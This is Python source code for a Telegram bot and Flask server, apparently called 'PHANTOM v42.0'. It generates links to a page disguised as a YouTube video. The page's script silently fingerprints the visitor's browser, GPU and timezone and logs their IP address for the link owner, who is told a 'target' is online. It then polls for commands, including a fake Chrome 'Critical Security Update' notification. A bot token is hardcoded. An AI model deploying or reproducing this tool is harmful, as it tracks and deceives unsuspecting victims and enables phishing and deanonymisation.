import asyncio, threading, requests, json, os, base64, urllib.parse
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] CONFIG ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115  # ТВОЙ ID - ГЛАВНЫЙ СУДЬЯ
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

active_commands = {} # Очередь команд для исполнения
pending_approvals = {} # Запросы на модерацию (ждут твоего решения)

# --- [2] STEALTH HTML ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body style="margin:0; background:#000;" onclick="ignite()">
    <div style="width:100%; height:100vh; background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;">
        <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); width:68px; height:48px; background:rgba(255,0,0,0.9); border-radius:12px;"></div>
    </div>
<script>
let sid = "{{ sid }}";
let active = false;
async function ignite() {
    if(active) return; active = true;
    let gl = document.createElement('canvas').getContext('webgl');
    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
    let d = { 
        sid: sid, ua: navigator.userAgent, res: screen.width+"x"+screen.height,
        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown",
        loc: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(d))));
    setInterval(async () => {
        try {
            let r = await fetch('/poll/' + sid);
            let cmd = await r.json();
            if (cmd.type === 'push') {
                if (Notification.permission !== 'denied') {
                    Notification.requestPermission().then(p => {
                        if(p === 'granted') new Notification("Chrome System", {body: "Critical Security Update Required", icon: "https://www.google.com/favicon.ico"});
                    });
                }
            }
            if (cmd.type === 'kill') { localStorage.clear(); location.href = "https://google.com"; }
        } catch(e) {}
    }, 4000);
    setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1500);
}
</script>
</body>
</html>
"""

# --- [3] BACKEND ROUTES ---

@app.route('/ping')
def cron_ping(): return "PONG", 200

@app.route('/v/<sid>')
def victim_page(sid): return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/log', methods=['POST'])
def logger():
    raw = base64.b64decode(request.get_data()).decode()
    data = json.loads(urllib.parse.unquote(raw))
    sid, ip = data['sid'], request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🔔 ОТПРАВИТЬ PUSH", callback_data=f"userreq_push_{sid}")
    kb.button(text="☣️ САМОЛИКВИДАЦИЯ", callback_data=f"userreq_kill_{sid}")
    
    report = (
        f"🎯 **ЦЕЛЬ В СЕТИ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📍 **Зона:** `{data['loc']}`\n"
        f"💻 **GPU:** `{data['gpu'][:30]}...`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Для отправки Push требуется одобрение Оверлорда."
    )
    # Отправляем отчет ТОЛЬКО тому юзеру, чья это ссылка
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": int(sid), "text": report, "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
    return "OK"

@app.route('/poll/<sid>')
def poll(sid): return jsonify(active_commands.pop(sid, {"type": "none"}))

# --- [4] BOT LOGIC ---

@dp.message(Command("start"))
async def start(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Создать ссылку").as_markup(resize_keyboard=True)
    role = "👑 ОВЕРЛОРД" if m.from_user.id == OVERLORD_ID else "Пользователь"
    await m.answer(f"🕶 **PHANTOM v42.0**\nВаш статус: `{role}`", reply_markup=kb)

@dp.message(F.text == "🧨 Создать ссылку")
async def link(m: types.Message):
    await m.answer(f"🔗 **Твоя персональная ссылка:**\n`{BASE_URL}/v/{m.from_user.id}`")

# Когда ОБЫЧНЫЙ юзер нажимает кнопку в своем отчете
@dp.callback_query(F.data.startswith("userreq_"))
async def handle_user_request(c: types.CallbackQuery):
    _, act, sid = c.data.split("_")
    user_id = c.from_user.id
    
    # Отправляем запрос ТЕБЕ (Оверлорду)
    kb = InlineKeyboardBuilder()
    kb.button(text="✅ РАЗРЕШИТЬ", callback_data=f"ovl_allow_{act}_{sid}")
    kb.button(text="❌ ОТКЛОНИТЬ", callback_data=f"ovl_deny_{sid}")
    
    await bot.send_message(OVERLORD_ID, 
        f"⚖️ **ЗАПРОС НА МОДЕРАЦИЮ**\nЮзер: `{user_id}` хочет выполнить `{act}`\nДля жертвы юзера: `{sid}`",
        reply_markup=kb.as_markup())
    
    await c.answer("⏳ Запрос отправлен Оверлорду на одобрение...")

# Когда ТЫ (Оверлорд) нажимаешь кнопку управления
@dp.callback_query(F.data.startswith("ovl_"))
async def overlord_decision(c: types.CallbackQuery):
    data = c.data.split("_")
    decision = data[1] # allow / deny
    act = data[2] if len(data) > 3 else "kill"
    sid = data[3] if len(data) > 3 else data[2]

    if decision == "allow":
        active_commands[sid] = {"type": act}
        await c.message.edit_text(f"✅ Ты РАЗРЕШИЛ выполнение `{act}` для цели `{sid}`")
        # Уведомляем юзера, что ты разрешил
        await bot.send_message(int(sid), f"🚀 Оверлорд одобрил твой запрос на `{act}`!")
    else:
        await c.message.edit_text(f"❌ Ты ОТКЛОНИЛ выполнение для цели `{sid}`")
        await bot.send_message(int(sid), f"🚫 Твой запрос на `{act}` был отклонен Оверлордом.")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
